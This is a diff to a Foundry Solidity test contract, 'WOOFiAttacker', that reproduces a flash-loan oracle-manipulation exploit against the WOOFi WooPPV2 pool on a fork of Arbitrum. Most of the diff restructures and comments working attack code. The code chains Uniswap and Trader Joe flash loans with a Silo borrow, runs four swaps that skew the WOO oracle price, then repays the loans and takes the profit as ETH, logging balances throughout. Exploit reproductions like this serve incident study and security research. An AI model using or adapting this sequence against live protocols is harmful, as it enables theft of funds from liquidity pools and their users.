@@ -39,6 +39,61 @@ contract WOOFiAttacker is Test {
         vm.createSelectFork("arb", txHash);
     }
 
+    function testAttack() public {
+        // log the state beforehand
+        console.log("Attacker's balance before attack:");
+        console.log("USDC:", IERC20(USDC).balanceOf(address(this)) / 1e6, "USDC");
+        console.log("WOO:", IERC20(WOO).balanceOf(address(this)) / 1e18, "WOO");
+        console.log("WETH:", IERC20(WETH).balanceOf(address(this)) / 1e18, "WETH");
+        uint256 ethBalanceBefore = address(this).balance;
+        console.log("ETH:", ethBalanceBefore / 1e18, "ETH");
+        console.log("");
+
+        // initiate the attack
+        initFlash();
+
+        // log the state after
+        console.log("Attacker's balance after attack:");
+        console.log("USDC:", IERC20(USDC).balanceOf(address(this)) / 1e6, "USDC");
+        console.log("WOO:", IERC20(WOO).balanceOf(address(this)) / 1e18, "WOO");
+        console.log("WETH:", IERC20(WETH).balanceOf(address(this)) / 1e18, "WETH");
+        uint256 ethBalanceAfter = address(this).balance;
+        console.log("ETH (profit):", (ethBalanceAfter - ethBalanceBefore) / 1e18, "ETH");
+
+    }
+
+    /// @notice Calls the pools flash function with data needed in `uniswapV3FlashCallback`
+    function initFlash() public {
+        // inital approvals required for the tokens 
+        IERC20(WOO).approve(address(WOOPPV2), max);
+        IERC20(WOO).approve(address(SILO), max);
+        IERC20(USDC).approve(address(SILO), max);
+        IERC20(USDC).approve(address(WOOPPV2), max);
+
+        // get the USDC balance of the UniSwap pool
+        uniSwapFlashAmount = IERC20(USDC).balanceOf(address(POOL));
+        console.log("");
+        console.log("UniSwap Flash Amount: ", uniSwapFlashAmount / 1e6, "USDC");
+
+        // flash loan USDC - calls uniswapV3FlashCallback
+        POOL.flash(
+            address(this),
+            0,
+            uniSwapFlashAmount,
+            abi.encode(uint256(1))
+        );
+
+        // swap excess USDC for WETH
+        int256 swapAmount = int256(IERC20(USDC).balanceOf(address(this)));
+        POOL.swap(address(this), false, swapAmount, 5148059652436460709226212, new bytes(0));
+
+        // withdraw excess WETH to this contract via the fallback function
+        uint256 excessWETHBalance = IERC20(WETH).balanceOf(address(this));
+        IWETH(WETH).withdraw(excessWETHBalance);
+        //uint256 excessWOOBalance = IERC20(WOO).balanceOf(address(this));
+        //IERC20(WOO).transfer({some_other_address}, excessWOOBalance); // would only need to do this if sending to an attaker EOA
+    }
+
     /// @param fee0 The fee from calling flash for token0
     /// @param fee1 The fee from calling flash for token1
     /// @param data The data needed in the callback passed as FlashCallbackData from `initFlash`
@@ -49,13 +104,18 @@ contract WOOFiAttacker is Test {
         uint256 fee1,
         bytes calldata data
     ) external {
-        // ILBFlashLoanCallback receiver, bytes32 amounts, bytes calldata data
         // flash loan WOO
+
+        // get the total pool amount 
         traderJoeFlashAmount = IERC20(WOO).balanceOf(address(TRADERJOE));
-        console.log("TJ Flash Amount: ", traderJoeFlashAmount, "WOO");
+        console.log("TJ Flash Amount: ", traderJoeFlashAmount / 1e18, "WOO");
         console.log("");
-        bytes32 hashAmount = bytes32(traderJoeFlashAmount);
-        TRADERJOE.flashLoan(ILBFlashLoanCallback(address(this)), hashAmount, new bytes(0));
+        bytes32 hashTraderJoeAmount = bytes32(traderJoeFlashAmount);
+
+        // initiate the flash loan - calls LBFlashLoanCallback
+        TRADERJOE.flashLoan(ILBFlashLoanCallback(address(this)), hashTraderJoeAmount, new bytes(0));
+
+        // repay the Uniswap flash loan
         IERC20(USDC).transfer(msg.sender, uniSwapFlashAmount + fee1);
     }
 
@@ -76,134 +136,115 @@ contract WOOFiAttacker is Test {
         uint256 amount = SILO.liquidity(WOO);
         SILO.borrow(WOO, amount);
 
-        console.log("Oracle prices before swapping:");
+        // log state before swapping
+        console.log("State before swapping");
+        console.log("Oracle prices (8 decimals):");
         console.log("USDC: ", _getPrice(USDC));
         console.log("WOO: ", _getPrice(WOO));
         console.log("WETH: ", _getPrice(WETH));
-        console.log("USDC balance:", IERC20(USDC).balanceOf(address(this)) / 1e6, "USDC");
-        console.log("WOO balance:", IERC20(WOO).balanceOf(address(this)) / 1e18, "WOO");
-        console.log("WETH balance:", IERC20(WETH).balanceOf(address(this)) / 1e18, "WETH");
-        console.log("USDC Reserve: ", _getTokenInfo(USDC) / 1e6);
-        console.log("WOO Reserve: ", _getTokenInfo(WOO) / 1e18);
-        console.log("WETH Reserve: ", _getTokenInfo(WETH) / 1e18);
+        console.log("Attacker's balance:");
+        console.log("USDC:", IERC20(USDC).balanceOf(address(this)) / 1e6, "USDC");
+        console.log("WOO:", IERC20(WOO).balanceOf(address(this)) / 1e18, "WOO");
+        console.log("WETH:", IERC20(WETH).balanceOf(address(this)) / 1e18, "WETH");
+        console.log("Reserves:");
+        console.log("USDC: ", _getTokenInfo(USDC) / 1e6, "USDC");
+        console.log("WOO: ", _getTokenInfo(WOO) / 1e18, "WOO");
+        console.log("WETH: ", _getTokenInfo(WETH) / 1e18, "WETH");
         console.log("");
 
-        // 4 consecutive swaps (to mess with pricing updates):
-        // Sets up the WOO to be cheap
+        // 4 consecutive swaps:
+
         // 1. USDC -> WETH
         IERC20(USDC).transfer(address(WOOPPV2), 2000000000000);
         WOOPPV2.swap(USDC, WETH, 2000000000000, 0, address(this), address(this));
-        console.log("Oracle prices after swapping USDC -> WETH:");
+        // log state
+        console.log("State after swapping USDC -> WETH");
+        console.log("Oracle prices (8 decimals):");
         console.log("USDC: ", _getPrice(USDC));
         console.log("WOO: ", _getPrice(WOO));
         console.log("WETH: ", _getPrice(WETH));
-        console.log("USDC balance:", IERC20(USDC).balanceOf(address(this)) / 1e6, "USDC");
-        console.log("WOO balance:", IERC20(WOO).balanceOf(address(this)) / 1e18, "WOO");
-        console.log("WETH balance:", IERC20(WETH).balanceOf(address(this)) / 1e18, "WETH");
-        console.log("USDC Reserve: ", _getTokenInfo(USDC) / 1e6);
-        console.log("WOO Reserve: ", _getTokenInfo(WOO) / 1e18);
-        console.log("WETH Reserve: ", _getTokenInfo(WETH) / 1e18);
+        console.log("Attacker's balance:");
+        console.log("USDC:", IERC20(USDC).balanceOf(address(this)) / 1e6, "USDC");
+        console.log("WOO:", IERC20(WOO).balanceOf(address(this)) / 1e18, "WOO");
+        console.log("WETH:", IERC20(WETH).balanceOf(address(this)) / 1e18, "WETH");
+        console.log("Reserves:");
+        console.log("USDC: ", _getTokenInfo(USDC) / 1e6, "USDC");
+        console.log("WOO: ", _getTokenInfo(WOO) / 1e18, "WOO");
+        console.log("WETH: ", _getTokenInfo(WETH) / 1e18, "WETH");
         console.log("");
+
         // 2. USDC -> WOO 
         IERC20(USDC).transfer(address(WOOPPV2), 100000000000);
         WOOPPV2.swap(USDC, WOO, 100000000000, 0, address(this), address(this));
-        console.log("Oracle prices after swapping USDC -> WOO:");
+        // log state
+        console.log("State after swapping USDC -> WOO");
+        console.log("Oracle prices (8 decimals):");
         console.log("USDC: ", _getPrice(USDC));
         console.log("WOO: ", _getPrice(WOO));
         console.log("WETH: ", _getPrice(WETH));
-        console.log("USDC balance:", IERC20(USDC).balanceOf(address(this)) / 1e6, "USDC");
-        console.log("WOO balance:", IERC20(WOO).balanceOf(address(this)) / 1e18, "WOO");
-        console.log("WETH balance:", IERC20(WETH).balanceOf(address(this)) / 1e18, "WETH");
-        console.log("USDC Reserve: ", _getTokenInfo(USDC) / 1e6);
-        console.log("WOO Reserve: ", _getTokenInfo(WOO) / 1e18);
-        console.log("WETH Reserve: ", _getTokenInfo(WETH) / 1e18);
+        console.log("Attacker's balance:");
+        console.log("USDC:", IERC20(USDC).balanceOf(address(this)) / 1e6, "USDC");
+        console.log("WOO:", IERC20(WOO).balanceOf(address(this)) / 1e18, "WOO");
+        console.log("WETH:", IERC20(WETH).balanceOf(address(this)) / 1e18, "WETH");
+        console.log("Reserves:");
+        console.log("USDC: ", _getTokenInfo(USDC) / 1e6, "USDC");
+        console.log("WOO: ", _getTokenInfo(WOO) / 1e18, "WOO");
+        console.log("WETH: ", _getTokenInfo(WETH) / 1e18, "WETH");
         console.log("");
+
         // 3. WOO -> USDC
         IERC20(WOO).transfer(address(WOOPPV2), 7856868800000000000000000);
         WOOPPV2.swap(WOO, USDC, 7856868800000000000000000, 0, address(this), address(this));
-        console.log("Oracle prices after swapping WOO -> USDC:");
+        // log state
+        console.log("State after swapping WOO -> USDC");
+        console.log("Oracle prices (8 decimals):");
         console.log("USDC: ", _getPrice(USDC));
         console.log("WOO: ", _getPrice(WOO));
         console.log("WETH: ", _getPrice(WETH));
-        console.log("USDC balance:", IERC20(USDC).balanceOf(address(this)) / 1e6, "USDC");
-        console.log("WOO balance:", IERC20(WOO).balanceOf(address(this)) / 1e18, "WOO");
-        console.log("WETH balance:", IERC20(WETH).balanceOf(address(this)) / 1e18, "WETH");
-        console.log("USDC Reserve: ", _getTokenInfo(USDC) / 1e6);
-        console.log("WOO Reserve: ", _getTokenInfo(WOO) / 1e18);
-        console.log("WETH Reserve: ", _getTokenInfo(WETH) / 1e18);
+        console.log("Attacker's balance:");
+        console.log("USDC:", IERC20(USDC).balanceOf(address(this)) / 1e6, "USDC");
+        console.log("WOO:", IERC20(WOO).balanceOf(address(this)) / 1e18, "WOO");
+        console.log("WETH:", IERC20(WETH).balanceOf(address(this)) / 1e18, "WETH");
+        console.log("Reserves:");
+        console.log("USDC: ", _getTokenInfo(USDC) / 1e6, "USDC");
+        console.log("WOO: ", _getTokenInfo(WOO) / 1e18, "WOO");
+        console.log("WETH: ", _getTokenInfo(WETH) / 1e18, "WETH");
         console.log("");
+
         // 4. USDC -> WOO // reap the rewards
         IERC20(USDC).transfer(address(WOOPPV2), 926342);
         WOOPPV2.swap(USDC, WOO, 926342, 0, address(this), address(this));
-        console.log("Oracle prices after swapping USDC -> WOO:");
+        // log state
+        console.log("State after swapping USDC -> WOO");
+        console.log("Oracle prices (8 decimals):");
         console.log("USDC: ", _getPrice(USDC));
         console.log("WOO: ", _getPrice(WOO));
         console.log("WETH: ", _getPrice(WETH));
-        console.log("USDC balance:", IERC20(USDC).balanceOf(address(this)) / 1e6, "USDC");
-        console.log("WOO balance:", IERC20(WOO).balanceOf(address(this)) / 1e18, "WOO");
-        console.log("WETH balance:", IERC20(WETH).balanceOf(address(this)) / 1e18, "WETH");
-        console.log("USDC Reserve: ", _getTokenInfo(USDC) / 1e6);
-        console.log("WOO Reserve: ", _getTokenInfo(WOO) / 1e18);
-        console.log("WETH Reserve: ", _getTokenInfo(WETH) / 1e18);
+        console.log("Attacker's balance:");
+        console.log("USDC:", IERC20(USDC).balanceOf(address(this)) / 1e6, "USDC");
+        console.log("WOO:", IERC20(WOO).balanceOf(address(this)) / 1e18, "WOO");
+        console.log("WETH:", IERC20(WETH).balanceOf(address(this)) / 1e18, "WETH");
+        console.log("Reserves:");
+        console.log("USDC: ", _getTokenInfo(USDC) / 1e6, "USDC");
+        console.log("WOO: ", _getTokenInfo(WOO) / 1e18, "WOO");
+        console.log("WETH: ", _getTokenInfo(WETH) / 1e18, "WETH");
         console.log("");
-        // repay WOO loan, receive USDC
+
+        // repay WOO loan to Silo & withdraw USDC
         SILO.repay(WOO, max);
         SILO.withdraw(USDC, max, true);
-        // NOTE: calculate this
-        IERC20(WOO).transfer(msg.sender, uint256(amounts) + uint256(totalFees));
-        // repay WOO flash loan & repay USDC flash loan automatically 
-        bytes32 rData = keccak256("LBPair.onFlashLoan");
-        return rData;
-    }
-
-    /// @notice Calls the pools flash function with data needed in `uniswapV3FlashCallback`
-    function initFlash() public {
-        // inital approvals required for the tokens 
-        IERC20(WOO).approve(address(WOOPPV2), max);
-        IERC20(WOO).approve(address(SILO), max);
-        IERC20(USDC).approve(address(SILO), max);
-        IERC20(USDC).approve(address(WOOPPV2), max);
-        // get the USDC balance of the UniSwap pool
-        uniSwapFlashAmount = IERC20(USDC).balanceOf(address(POOL));
-        console.log("");
-        console.log("UniSwap Flash Amount: ", uniSwapFlashAmount, "USDC");
-        // flash loan USDC
-        POOL.flash(
-            address(this),
-            0,
-            uniSwapFlashAmount,
-            abi.encode(uint256(1))
-        );
-        // swap excess USDC for WETH
-        int256 swapAmount = int256(IERC20(USDC).balanceOf(address(this)));
-        POOL.swap(address(this), false, swapAmount, 5148059652436460709226212, new bytes(0));
-        // send excess WOO to another address (which converts to ETH)
-        uint256 excessWETHBalance = IERC20(WETH).balanceOf(address(this));
-        IWETH(WETH).withdraw(excessWETHBalance);
-        uint256 excessWOOBalance = IERC20(WOO).balanceOf(address(this));
-        //IERC20(WOO).transfer({some_other_address}, excessWOOBalance); // would only need to do this if sending to an attaker EOA
-    }
-
-    function testAttack() public {
-        console.log("Attacker's balance before attack:");
-        console.log("USDC:", IERC20(USDC).balanceOf(address(this)) / 1e6, "USDC");
-        console.log("WOO:", IERC20(WOO).balanceOf(address(this)) / 1e18, "WOO");
-        console.log("WETH:", IERC20(WETH).balanceOf(address(this)) / 1e18, "WETH");
-        uint256 ethBalanceBefore = address(this).balance;
-        console.log("ETH:", ethBalanceBefore / 1e18, "ETH");
         
-        console.log("");
-        initFlash();
-        console.log("Attacker's balance after attack:");
-        console.log("USDC:", IERC20(USDC).balanceOf(address(this)) / 1e6, "USDC");
-        console.log("WOO:", IERC20(WOO).balanceOf(address(this)) / 1e18, "WOO");
-        console.log("WETH:", IERC20(WETH).balanceOf(address(this)) / 1e18, "WETH");
-        uint256 ethBalanceAfter = address(this).balance;
-        console.log("ETH (profit):", (ethBalanceAfter - ethBalanceBefore) / 1e18, "ETH");
+        // repay the Trader Joe flash loan
+        IERC20(WOO).transfer(msg.sender, uint256(amounts) + uint256(totalFees));
 
+        // TJ flash loans require the following data to be returned
+        bytes32 returnData = keccak256("LBPair.onFlashLoan");
+        return returnData;
     }
 
     receive() external payable {}
+
+    /* ----- Helper Functions ----- */
 
     function _getPrice(address asset) internal view returns (uint256) {
         (uint256 priceNow, bool feasible) = WOOORACLEV2.price(asset);
